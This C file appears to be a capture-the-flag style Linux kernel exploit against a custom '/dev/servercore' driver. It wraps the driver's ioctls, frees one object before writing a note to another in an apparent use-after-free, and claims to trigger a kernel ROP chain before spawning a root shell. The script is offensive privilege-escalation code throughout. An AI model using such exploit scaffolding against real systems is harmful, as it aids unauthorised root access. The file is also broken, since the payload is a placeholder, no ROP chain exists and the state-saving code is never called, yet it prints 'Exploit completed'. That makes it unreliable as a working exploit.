#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>

#define DO_CREATE    0xc020ca00
#define DO_READ      0xc020ca01
#define DO_NOTE      0xc020ca02
#define DO_DELETE    0xc020ca03
#define DO_SYNC      0xc020ca04

// Global variables
int fd = 0; 
uint64_t kernel_base = 0xffffffff81000000;
uint64_t heap_leak = 0; 

// Module stuff
struct req {
    uint64_t idx;
    uint64_t info_addr;
    uint64_t note_size;
    uint64_t note_addr;
};

int create_data(char * info, char * note_addr) {
    struct req req; 
    req.idx = 0; 
    req.info_addr = (uint64_t) info;
    req.note_size = 0;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Performed create\n");
    return 0;
}

int read_data(char * info, uint64_t idx, char * note_addr) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = (uint64_t) info;
    req.note_size = 0;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int note_data(uint64_t idx, uint64_t note_size, char * note_addr) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = note_size;
    req.note_addr = (uint64_t) note_addr; 
    
    if (ioctl(fd, DO_NOTE, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Created note for object %d\n", idx);
    return 0;
}

int delete_data(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = 0;
    req.note_addr = 0; 
    
    if (ioctl(fd, DO_DELETE, &req) < 0) {
        perror("[!] Delete failed");
        return -1;
    }
    printf("[+] Performed delete\n");
    return 0;
}

int sync_data(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.info_addr = 0;
    req.note_size = 0;
    req.note_addr = 0; 
    
    if (ioctl(fd, DO_SYNC, &req) < 0) {
        perror("[!] Sync failed");
        return -1;
    }
    printf("[+] Performed sync\n");
    return 0;
}

// PWNY STUFF
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// GET SHELL
void get_shell(void) {
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

int main(void) {
    // STAGE 1: SETUP
    printf("STAGE 1: SETUP\n");
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Open servercore device
    printf("[+] Opening servercore device\n");
    if ((fd = open("/dev/servercore", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // STAGE 2: EXPLOIT FLOW
    printf("STAGE 2: EXPLOIT FLOW\n");

    // Create data_unit 0
    char info1[0x100] = "Data for unit 0";
    char note1[0x100] = "Note for unit 0";
    if (create_data(info1, note1) < 0) {
        printf("[!] Failed to create data_unit 0\n");
        exit(-1);
    }

    // Create data_unit 1
    char info2[0x100] = "Data for unit 1";
    char note2[0x100] = "Note for unit 1";
    if (create_data(info2, note2) < 0) {
        printf("[!] Failed to create data_unit 1\n");
        exit(-1);
    }

    // Delete data_unit 0
    if (delete_data(0) < 0) {
        printf("[!] Failed to delete data_unit 0\n");
        exit(-1);
    }

    // Note operation on data_unit 1
    char note_for_unit1[0x100] = "Exploit payload in note";
    if (note_data(1, sizeof(note_for_unit1), note_for_unit1) < 0) {
        printf("[!] Failed to create note for data_unit 1\n");
        exit(-1);
    }

    // Trigger kernel ROP with sync
    if (sync_data(1) < 0) {
        printf("[!] Failed to sync data_unit 1\n");
        exit(-1);
    }

    printf("[+] Exploit completed\n");

    get_shell();

    return 0; 
}

